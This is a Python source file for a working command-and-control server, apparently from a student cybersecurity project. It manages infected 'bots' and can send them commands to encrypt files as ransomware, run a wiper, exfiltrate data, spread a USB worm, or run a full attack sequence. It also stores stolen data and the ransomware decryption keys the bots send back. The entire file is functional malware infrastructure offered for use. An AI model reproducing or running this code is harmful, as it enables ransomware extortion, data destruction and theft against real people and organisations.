"""
ENHANCED COMMAND & CONTROL (C2) SERVER
======================================
Advanced C2 server with multiple features:
- Real-time bot management and monitoring
- Command execution on infected machines
- Data exfiltration reception and storage
- Interactive command console
- Bot persistence management

Author: CADT Cyber Security Project
Date: November 28, 2025
Run on: Kali Linux (Attacker Machine)
"""

# Standard library imports for C2 server functionality
import socket      # TCP socket communication with bots
import threading   # Multi-threaded bot handling
import json        # JSON protocol for commands and data
import time        # Timestamps and timing
import os          # File and directory operations
from datetime import datetime  # Human-readable timestamps
import base64      # Base64 encoding/decoding for file transfers

class EnhancedC2Server:
    """
    Enhanced Command & Control (C2) Server
    
    This server provides centralized control over infected machines (bots).
    
    Key Features:
    - Multi-bot management with unique IDs
    - Real-time command execution on bots
    - Data exfiltration reception and storage
    - Interactive operator console
    - Organized file storage (bots/, logs/, exfiltrated_data/)
    - Auto-execute broadcast command
    
    Architecture:
    - Main thread: Accepts new bot connections
    - Console thread: Interactive operator interface
    - Bot threads: One thread per connected bot
    """
    
    # Available commands that can be sent to bots
    # This ensures synchronization with chimera_real.py execute_command() method
    AVAILABLE_COMMANDS = {
        'encrypt_files': 'Trigger ransomware encryption on target files',
        'corrupt_system': 'Execute system corruption (wiper) payload',
        'exfiltrate': 'Steal and send sensitive data to C2',
        'system_info': 'Collect detailed system information',
        'status': 'Get current bot status and statistics',
        'propagate': 'Trigger USB worm propagation',
        'auto_execute': 'Execute full attack sequence (all payloads)',
        'shutdown': 'Terminate malware and close connection'
    }
    
    def __init__(self, host='0.0.0.0', port=4444):
        """
        Initialize C2 server with configuration
        
        Args:
            host: IP address to bind to (0.0.0.0 = all interfaces)
            port: TCP port to listen on (default 4444)
        """
        self.host = host
        self.port = port
        
        # Dictionary of active bots
        # Format: {bot_id: {'socket': socket, 'info': dict, 'last_seen': timestamp, 'status': str}}
        self.active_bots = {}
        
        # Counter for assigning unique bot IDs (BOT_0001, BOT_0002, etc.)
        self.bot_counter = 0
        
        # Server control flag
        self.server_running = True
        
        # Create directory structure for organized data storage
        self.create_directories()
        
    def create_directories(self):
        """
        Create organized directory structure for C2 operations
        
        Directories:
        - bots/: Bot registration information (JSON files)
        - exfiltrated_data/: Stolen data from bots
        - encryption_keys/: Ransomware decryption keys (CRITICAL)
        - logs/: Server activity logs
        - commands/: Command execution results
        """
        directories = ['bots', 'exfiltrated_data', 'encryption_keys', 'logs', 'commands']
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
    
    def log_event(self, message, level="INFO"):
        """
        Log server events with timestamps to console and file
        
        Args:
            message: The event message to log
            level: Severity level (INFO, ERROR, EXFILTRATION)
        
        All events are:
        - Printed to console with timestamp
        - Written to logs/c2_server.log for persistence
        """
        # Create timestamped log message
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        print(log_message)
        
        # Append to persistent log file
        with open("logs/c2_server.log", "a") as log_file:
            log_file.write(log_message + "\n")
    
    def handle_bot_connection(self, client_socket, client_address):
        """
        Handle individual bot connections in a dedicated thread
        
        This method:
        1. Receives bot handshake with system information
        2. Assigns unique bot ID (BOT_0001, BOT_0002, etc.)
        3. Registers bot in active_bots dictionary
        4. Saves bot info to bots/ directory
        5. Enters command loop to receive data and send commands
        
        Args:
            client_socket: Socket object for this bot connection
            client_address: Tuple of (IP, port) for this bot
        
        Protocol:
        - Bot sends: JSON handshake with system info
        - Server sends: JSON command messages
        - Bot sends: JSON responses (status, command_result, exfiltration)
        """
        # Assign unique bot ID
        bot_id = f"BOT_{self.bot_counter:04d}"  # Format: BOT_0001
        self.bot_counter += 1
        
        self.log_event(f"New bot connection: {bot_id} from {client_address[0]}:{client_address[1]}")
        
        try:
            # Receive initial handshake from bot
            initial_data = client_socket.recv(4096).decode('utf-8')
            bot_info = json.loads(initial_data)
            
            # Check if handshake contains encryption key (sent immediately after ransomware)
            if 'encryption_key' in bot_info and bot_info.get('encryption_key'):
                # Bot has already encrypted files and is sending key
                key_message = {
                    'type': 'encryption_key',
                    'key': bot_info['encryption_key'],
                    'computer_name': bot_info.get('computer_name', 'Unknown'),
                    'username': bot_info.get('username', 'Unknown'),
                    'encrypted_files': bot_info.get('encrypted_files', 0),
                    'timestamp': bot_info.get('timestamp', time.time())
                }
                # Process the encryption key immediately
                self.process_bot_data(bot_id, json.dumps(key_message).encode())
            
            # Register bot in active list
            self.active_bots[bot_id] = {
                'socket': client_socket,
                'info': bot_info,
                'address': client_address,
                'last_seen': time.time(),
                'status': 'ACTIVE'
            }
            
            self.log_event(f"Bot {bot_id} registered: {bot_info.get('computer_name', 'Unknown')} - {bot_info.get('username', 'Unknown')}")
            
            # Save bot information to file
            bot_file = f"bots/{bot_id}.json"
            with open(bot_file, 'w') as f:
                json.dump(bot_info, f, indent=4)
            
            # Send welcome command
            welcome_message = {
                "command": "status",
                "parameters": "Welcome to C2 server. Awaiting commands.",
                "timestamp": time.time()
            }
            client_socket.send(json.dumps(welcome_message).encode())
            
            # Main command loop for this bot
            while self.server_running:
                try:
                    # Check for data from bot
                    client_socket.settimeout(2.0)  # Non-blocking receive
                    
                    data = client_socket.recv(16384)  # Larger buffer for file transfers
                    if not data:
                        break
                    
                    # Process received data
                    self.process_bot_data(bot_id, data)
                    
                    # Update last seen
                    self.active_bots[bot_id]['last_seen'] = time.time()
                    
                except socket.timeout:
                    # No data received, continue
                    continue
                except Exception as e:
                    self.log_event(f"Error handling bot {bot_id}: {e}", "ERROR")
                    break
                    
        except Exception as e:
            self.log_event(f"Failed to handle bot connection: {e}", "ERROR")
        finally:
            # Clean up bot connection
            if bot_id in self.active_bots:
                self.active_bots[bot_id]['status'] = 'DISCONNECTED'
                self.log_event(f"Bot {bot_id} disconnected")
            client_socket.close()
    
    def process_bot_data(self, bot_id, data):
        """
        Process data received from bots
        
        Bots can send four types of messages:
        1. status: Simple status updates
        2. exfiltration: Stolen data (JSON or base64-encoded binary)
        3. command_result: Results from executed commands
        4. encryption_key: Ransomware decryption keys (CRITICAL)
        
        Args:
            bot_id: Unique identifier for the bot (e.g., BOT_0001)
            data: Raw bytes received from bot
        
        Data is saved to exfiltrated_data/, commands/, or encryption_keys/ directories
        """
        try:
            # Try to parse as JSON (structured data)
            decoded_data = data.decode('utf-8')
            message = json.loads(decoded_data)
            
            message_type = message.get('type', 'unknown')
            
            # MESSAGE TYPE 1: Status Update
            if message_type == 'status':
                self.log_event(f"Bot {bot_id} status: {message.get('data', 'No data')}")
            
            # MESSAGE TYPE 2: Encryption Key (CRITICAL - Highest Priority)
            elif message_type == 'encryption_key':
                # Save encryption key with multiple backups
                timestamp = int(time.time())
                key_data = message.get('key', '')
                computer_name = message.get('computer_name', 'Unknown')
                username = message.get('username', 'Unknown')
                encrypted_files = message.get('encrypted_files', 0)
                
                # Primary key file (by bot_id)
                key_file_primary = f"encryption_keys/{bot_id}_key_{timestamp}.txt"
                # Secondary key file (by hostname)
                key_file_secondary = f"encryption_keys/{computer_name}_{username}_key_{timestamp}.txt"
                # Master key file (all keys appended)
                master_key_file = "encryption_keys/MASTER_KEY_BACKUP.txt"
                
                # Prepare detailed key information
                key_info = f"""
{'='*70}
ENCRYPTION KEY RECEIVED
{'='*70}
Bot ID: {bot_id}
Computer: {computer_name}
Username: {username}
Encrypted Files: {encrypted_files}
Timestamp: {time.ctime(timestamp)}
{'='*70}
DECRYPTION KEY (Copy exactly):
{key_data}
{'='*70}

Decryption Command:
python chimera_real.py --decrypt {key_data}
{'='*70}
"""
                
                # Save to primary file
                with open(key_file_primary, 'w') as f:
                    f.write(key_info)
                
                # Save to secondary file
                with open(key_file_secondary, 'w') as f:
                    f.write(key_info)
                
                # Append to master backup file
                with open(master_key_file, 'a') as f:
                    f.write(f"\n{key_info}\n")
                
                # Save as JSON for programmatic access
                json_key_file = f"encryption_keys/{bot_id}_key_{timestamp}.json"
                with open(json_key_file, 'w') as f:
                    json.dump(message, f, indent=4)
                
                # Log with CRITICAL level
                self.log_event(
                    f"🔑 ENCRYPTION KEY RECEIVED from {bot_id} ({computer_name}/{username}) - {encrypted_files} files encrypted",
                    "CRITICAL"
                )
                self.log_event(f"   Key saved to: {key_file_primary}", "CRITICAL")
                self.log_event(f"   Backup saved to: {key_file_secondary}", "CRITICAL")
                self.log_event(f"   Master backup: {master_key_file}", "CRITICAL")
                
                # Update bot info with encryption key
                if bot_id in self.active_bots:
                    self.active_bots[bot_id]['encryption_key'] = key_data
                    self.active_bots[bot_id]['encrypted_files'] = encrypted_files
                
            # MESSAGE TYPE 3: Exfiltrated Data
            elif message_type == 'exfiltration':
                # Save exfiltrated data with timestamp
                filename = f"exfiltrated_data/{bot_id}_{int(time.time())}.json"
                exfil_data = message.get('data', '')
                file_count = message.get('file_count', 0)
                stolen_samples = message.get('stolen_samples', 0)
                
                # Handle base64 encoded file data (for binary files)
                if message.get('encoding') == 'base64':
                    file_data = base64.b64decode(exfil_data)
                    with open(filename, 'wb') as f:
                        f.write(file_data)
                    self.log_event(f"Bot {bot_id} exfiltrated binary file: {filename}", "EXFILTRATION")
                else:
                    # Plain text/JSON data
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(exfil_data)
                    self.log_event(f"Bot {bot_id} exfiltrated {stolen_samples} samples: {filename}", "EXFILTRATION")
                
                # Display exfiltration summary
                print("\n" + "="*70)
                print(f"📤 EXFILTRATION RECEIVED FROM {bot_id}")
                print("="*70)
                print(f"Stolen samples: {stolen_samples}")
                print(f"Encrypted files: {file_count}")
                print(f"Data saved to: {filename}")
                print(f"Size: {len(exfil_data)} bytes")
                print("="*70 + "\n")
                
            # MESSAGE TYPE 4: Command Result
            elif message_type == 'command_result':
                result = message.get('result', 'No result')
                command = message.get('command', 'unknown')
                
                # Format output nicely
                print("\n" + "="*70)
                print(f"📩 COMMAND RESULT FROM {bot_id}")
                print("="*70)
                print(f"Command: {command}")
                print(f"Timestamp: {time.ctime()}")
                print("-"*70)
                print(f"Result:\n{result}")
                print("="*70 + "\n")
                
                # Also log to file
                self.log_event(f"Bot {bot_id} executed '{command}' - Result: {result}")
                
                # Save command result to file with better formatting
                result_file = f"commands/{bot_id}_{command}_{int(time.time())}.txt"
                with open(result_file, 'w') as f:
                    f.write(f"Bot ID: {bot_id}\n")
                    f.write(f"Command: {command}\n")
                    f.write(f"Timestamp: {time.ctime()}\n")
                    f.write("="*70 + "\n")
                    f.write(str(result))
                    f.write("\n" + "="*70)
                    
        except (json.JSONDecodeError, UnicodeDecodeError):
            # Handle binary data (file uploads)
            filename = f"exfiltrated_data/{bot_id}_binary_{int(time.time())}.bin"
            with open(filename, 'wb') as f:
                f.write(data)
            self.log_event(f"Bot {bot_id} uploaded binary file: {filename} ({len(data)} bytes)", "EXFILTRATION")
    
    def send_command_to_bot(self, bot_id, command, parameters=""):
        """
        Send a command to a specific bot
        
        Args:
            bot_id: Target bot identifier (e.g., BOT_0001)
            command: Command to execute (encrypt_files, exfiltrate, etc.)
            parameters: Optional command parameters
        
        Returns:
            True if command was sent successfully, False otherwise
        
        Command Format:
        {
            "command": "encrypt_files",
            "parameters": "",
            "timestamp": 1234567890.123
        }
        """
        # Validate command
        if command not in self.AVAILABLE_COMMANDS:
            self.log_event(f"Invalid command: {command}. Use 'help' to see available commands.", "ERROR")
            return False
        
        # Check if bot is active
        if bot_id not in self.active_bots or self.active_bots[bot_id]['status'] != 'ACTIVE':
            self.log_event(f"Cannot send command to {bot_id}: Bot not active", "ERROR")
            return False
        
        try:
            # Construct JSON command message
            command_message = {
                "command": command,
                "parameters": parameters,
                "timestamp": time.time()
            }
            
            # Get bot's socket and send command
            bot_socket = self.active_bots[bot_id]['socket']
            bot_socket.send(json.dumps(command_message).encode())
            
            # Enhanced logging with command description
            cmd_desc = self.AVAILABLE_COMMANDS[command]
            self.log_event(f"✓ Sent to {bot_id}: {command} - {cmd_desc}")
            return True
            
        except Exception as e:
            self.log_event(f"Failed to send command to {bot_id}: {e}", "ERROR")
            return False
    
    def broadcast_command(self, command, parameters=""):
        """
        Send a command to all active bots simultaneously
        
        Args:
            command: Command to broadcast (auto_execute, status, etc.)
            parameters: Optional parameters
        
        Returns:
            Dictionary with results per bot {bot_id: "Sent"/"Failed"}
        
        Use cases:
        - auto_execute: Trigger full attack on all bots
        - status: Check if all bots are alive
        - shutdown: Terminate all bots
        """
        self.log_event(f"Broadcasting command to all bots: {command}")
        results = {}
        
        # Iterate through all bots
        for bot_id in list(self.active_bots.keys()):
            # Only send to active bots
            if self.active_bots[bot_id]['status'] == 'ACTIVE':
                success = self.send_command_to_bot(bot_id, command, parameters)
                results[bot_id] = "Sent" if success else "Failed"
        
        return results
    
    def list_bots(self):
        """Display all connected bots"""
        current_time = time.time()
        print("\n" + "="*60)
        print("ACTIVE BOTS")
        print("="*60)
        
        if not self.active_bots:
            print("No active bots connected")
            return
        
        for bot_id, bot_info in self.active_bots.items():
            last_seen = current_time - bot_info['last_seen']
            status = bot_info['status']
            computer_name = bot_info['info'].get('computer_name', 'Unknown')
            username = bot_info['info'].get('username', 'Unknown')
            
            print(f"{bot_id}: {computer_name} ({username})")
            print(f"  Status: {status}, Last Seen: {last_seen:.1f}s ago")
            print(f"  IP: {bot_info['address'][0]}:{bot_info['address'][1]}")
            
            # Show encryption info if available
            if 'encryption_key' in bot_info:
                print(f"  🔑 Encryption Key: Available ({bot_info.get('encrypted_files', 0)} files)")
            print()
    
    def list_encryption_keys(self):
        """Display all encryption keys received from bots"""
        print("\n" + "="*70)
        print("ENCRYPTION KEYS RECEIVED")
        print("="*70)
        
        # Check encryption_keys directory
        if not os.path.exists('encryption_keys'):
            print("No encryption keys received yet")
            return
        
        # List all key files
        key_files = [f for f in os.listdir('encryption_keys') if f.endswith('.json')]
        
        if not key_files:
            print("No encryption keys received yet")
            return
        
        print(f"Total keys: {len(key_files)}\n")
        
        for key_file in sorted(key_files):
            try:
                with open(f"encryption_keys/{key_file}", 'r') as f:
                    key_data = json.load(f)
                
                bot_id = key_data.get('bot_id', 'Unknown')
                computer = key_data.get('computer_name', 'Unknown')
                username = key_data.get('username', 'Unknown')
                files = key_data.get('encrypted_files', 0)
                key = key_data.get('key', 'N/A')
                timestamp = key_data.get('timestamp', 0)
                
                print(f"Bot: {computer}/{username}")
                print(f"Files Encrypted: {files}")
                print(f"Received: {time.ctime(timestamp)}")
                print(f"Key File: {key_file}")
                print(f"Decryption Key: {key}")
                print(f"Decrypt Command: python chimera_real.py --decrypt {key}")
                print("-" * 70)
            except:
                continue
        
        print(f"\nMaster backup: encryption_keys/MASTER_KEY_BACKUP.txt")
        print("="*70)
    
    def get_local_ip(self):
        """Get the local IP address of this machine (Kali Linux)"""
        try:
            # Create a socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to external address (doesn't actually send data)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            # Fallback to localhost if cannot determine
            return "127.0.0.1"
    
    def cleanup_inactive_bots(self):
        """Remove bots that haven't been seen in a while"""
        current_time = time.time()
        inactive_threshold = 300  # 5 minutes
        
        inactive_bots = []
        for bot_id, bot_info in self.active_bots.items():
            if current_time - bot_info['last_seen'] > inactive_threshold:
                inactive_bots.append(bot_id)
        
        for bot_id in inactive_bots:
            self.log_event(f"Removing inactive bot: {bot_id}")
            del self.active_bots[bot_id]
    
    def show_help(self):
        """Display comprehensive help information"""
        print("\n" + "="*70)
        print("C2 SERVER COMMAND REFERENCE")
        print("="*70)
        print("\n📋 SERVER MANAGEMENT COMMANDS:")
        print("  help              - Show this help message")
        print("  list              - Show all connected bots with details")
        print("  keys              - Show all encryption keys received")
        print("  status            - Show server status and statistics")
        print("  cleanup           - Remove inactive/disconnected bots")
        print("  exit              - Gracefully shutdown C2 server")
        
        print("\n🎯 BOT CONTROL COMMANDS:")
        print("  send <bot_id> <command>     - Send command to specific bot")
        print("  broadcast <command>         - Send command to all active bots")
        
        print("\n💣 AVAILABLE BOT COMMANDS (use with 'send' or 'broadcast'):")
        for cmd, desc in self.AVAILABLE_COMMANDS.items():
            print(f"  {cmd:<20} - {desc}")
        
        print("\n📝 EXAMPLES:")
        print("  send BOT_0001 system_info   - Get system info from BOT_0001")
        print("  broadcast status            - Get status from all bots")
        print("  broadcast auto_execute      - Execute full attack on all bots")
        print("  send BOT_0002 encrypt_files - Encrypt files on BOT_0002")
        print("="*70 + "\n")
    
    def interactive_console(self):
        """Interactive command console for C2 operator"""
        print("\n" + "="*70)
        print("🎮 ENHANCED C2 SERVER - INTERACTIVE CONSOLE")
        print("="*70)
        print("Type 'help' for available commands")
        print("="*70 + "\n")
        
        while self.server_running:
            try:
                user_input = input("C2> ").strip()
                
                if not user_input:
                    continue
                
                # Parse command
                parts = user_input.split()
                command = parts[0].lower()
                
                # ===== SERVER MANAGEMENT COMMANDS =====
                
                if command == "exit" or command == "quit":
                    print("\n⚠️  Shutting down C2 server...")
                    self.shutdown()
                    break
                
                elif command == "help" or command == "?":
                    self.show_help()
                    
                elif command == "list" or command == "bots":
                    self.list_bots()
                
                elif command == "keys":
                    self.list_encryption_keys()
                    
                elif command == "cleanup":
                    self.cleanup_inactive_bots()
                    print("✓ Cleaned up inactive bots\n")
                    
                elif command == "status":
                    active_count = len([b for b in self.active_bots.values() if b['status'] == 'ACTIVE'])
                    print("\n" + "="*50)
                    print("📊 C2 SERVER STATUS")
                    print("="*50)
                    print(f"Server Address: {self.host}:{self.port}")
                    print(f"Active Bots: {active_count}")
                    print(f"Total Connections: {self.bot_counter}")
                    print(f"Uptime: Running")
                    print("="*50 + "\n")
                
                # ===== BOT CONTROL COMMANDS =====
                    
                elif command == "send" or command == "cmd":
                    if len(parts) >= 3:
                        bot_id = parts[1]
                        bot_command = parts[2]
                        params = ' '.join(parts[3:]) if len(parts) > 3 else ""
                        
                        # Validate bot command
                        if bot_command not in self.AVAILABLE_COMMANDS:
                            print(f"❌ Invalid command: {bot_command}")
                            print(f"Available commands: {', '.join(self.AVAILABLE_COMMANDS.keys())}")
                            print("Type 'help' for more information\n")
                        else:
                            if self.send_command_to_bot(bot_id, bot_command, params):
                                print(f"✓ Command '{bot_command}' sent to {bot_id}\n")
                            else:
                                print(f"❌ Failed to send command to {bot_id}\n")
                    else:
                        print("Usage: send <bot_id> <command> [parameters]")
                        print("Example: send BOT_0001 system_info\n")
                        
                elif command == "broadcast" or command == "bc":
                    if len(parts) >= 2:
                        bot_command = parts[1]
                        params = ' '.join(parts[2:]) if len(parts) > 2 else ""
                        
                        # Validate bot command
                        if bot_command not in self.AVAILABLE_COMMANDS:
                            print(f"❌ Invalid command: {bot_command}")
                            print(f"Available commands: {', '.join(self.AVAILABLE_COMMANDS.keys())}")
                            print("Type 'help' for more information\n")
                        else:
                            active_count = len([b for b in self.active_bots.values() if b['status'] == 'ACTIVE'])
                            if active_count == 0:
                                print("❌ No active bots to broadcast to\n")
                            else:
                                print(f"📡 Broadcasting '{bot_command}' to {active_count} bot(s)...")
                                results = self.broadcast_command(bot_command, params)
                                
                                # Display results
                                success = len([r for r in results.values() if r == "Sent"])
                                failed = len([r for r in results.values() if r == "Failed"])
                                print(f"✓ Sent: {success} | ❌ Failed: {failed}\n")
                    else:
                        print("Usage: broadcast <command> [parameters]")
                        print("Example: broadcast auto_execute\n")
                
                # ===== SHORTCUT COMMANDS =====
                
                elif command == "autoexec" or command == "auto":
                    print("📡 Broadcasting 'auto_execute' to all bots...")
                    results = self.broadcast_command("auto_execute", "")
                    success = len([r for r in results.values() if r == "Sent"])
                    print(f"✓ Auto-execute sent to {success} bot(s)\n")
                        
                else:
                    print(f"❌ Unknown command: {command}")
                    print("Type 'help' for available commands\n")
                    
            except KeyboardInterrupt:
                print("\n⚠️  Interrupted. Type 'exit' to shutdown server.\n")
            except Exception as e:
                print(f"❌ Console error: {e}\n")
    
    def start_server(self):
        """Start the enhanced C2 server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(10)  # Increased backlog
            server_socket.settimeout(1.0)  # Allow periodic checks
            
            # Get Kali Linux IP address
            kali_ip = self.get_local_ip()
            
            print("\n" + "="*70)
            print("🎮 ENHANCED C2 SERVER STARTED")
            print("="*70)
            self.log_event(f"Enhanced C2 Server started on {self.host}:{self.port}")
            print(f"📡 Server IP Address: {kali_ip}")
            print(f"🔌 Listening Port: {self.port}")
            print(f"📂 Data Directory: {os.getcwd()}")
            print("="*70)
            print(f"⚠️  Configure victims to connect to: {kali_ip}:{self.port}")
            print("="*70 + "\n")
            self.log_event("Waiting for bot connections...")
            
            # Start console in separate thread
            console_thread = threading.Thread(target=self.interactive_console, daemon=True)
            console_thread.start()
            
            # Main server loop
            while self.server_running:
                try:
                    client_socket, client_address = server_socket.accept()
                    
                    # Handle each bot in separate thread
                    bot_thread = threading.Thread(
                        target=self.handle_bot_connection, 
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    bot_thread.start()
                    
                except socket.timeout:
                    # Timeout for accept, check if server should shutdown
                    continue
                except Exception as e:
                    if self.server_running:
                        self.log_event(f"Server accept error: {e}", "ERROR")
                    
        except Exception as e:
            self.log_event(f"Failed to start server: {e}", "ERROR")
        finally:
            server_socket.close()
            self.log_event("C2 Server shutdown complete")
    
    def shutdown(self):
        """Gracefully shutdown the C2 server"""
        self.log_event("Initiating server shutdown...")
        self.server_running = False
        
        # Close all bot connections
        for bot_id, bot_info in self.active_bots.items():
            try:
                bot_info['socket'].close()
            except:
                pass
        
        self.active_bots.clear()

if __name__ == "__main__":
    # You can customize host and port here
    c2_server = EnhancedC2Server(host='0.0.0.0', port=4444)
    c2_server.start_server()